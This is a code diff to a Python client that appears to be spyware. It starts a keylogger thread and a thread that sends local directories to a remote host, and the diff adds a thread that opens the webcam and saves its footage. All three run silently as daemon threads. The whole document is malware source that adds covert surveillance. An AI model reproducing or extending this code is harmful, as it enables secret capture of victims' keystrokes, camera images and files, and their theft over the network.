@@ -5,12 +5,12 @@ Created on Wed Jun 17 19:56:16 2020
 
 @author: 劉又聖
 """
-
 import socket, sys, os, logging, platform, time
 import threading as th
 from keylogger import keylogger
 from networkAPI import NetAPI
-from config import *
+from config import upload_dirs, client_save_dirs
+from camera import video_main
 
 #TODO 寫個check file routine
 def scan_dir_and_cktime(dir_path):
@@ -96,8 +96,10 @@ def client(host, port):
     # Create thread
     threads          = []
     send_thread      = th.Thread(name='Send dirs thread', target=send_dir,
-                                 args=(handle, start_dirs,))
+                                 args=(handle, start_dirs), daemon=True)
     keylogger_thread = th.Thread(name='KeyLogger thread', target=keylogger,
+                                 args=(save_local_dirs,), daemon=True)
+    cammera_thread   = th.Thread(name='Open the webcam',  target=video_main,
                                  args=(save_local_dirs,), daemon=True)
     
     #TODO: Daily check dir & send them
@@ -107,6 +109,9 @@ def client(host, port):
     #TODO: Run keylogger
     keylogger_thread.start()
     threads.append(keylogger_thread)
+    #TODO: Run webcam
+    cammera_thread.start()
+    threads.append(cammera_thread)
     
     #for thread in threads:
     #    thread.join()
@@ -118,7 +123,7 @@ def client(host, port):
     return None
     
 def main():
-    msg = "Usage: %s host port" % sys.argv[0]
+    msg = "Usage: {} host port".format(sys.argv[0])  
     if len(sys.argv) != 3:
         print(msg)
     else:
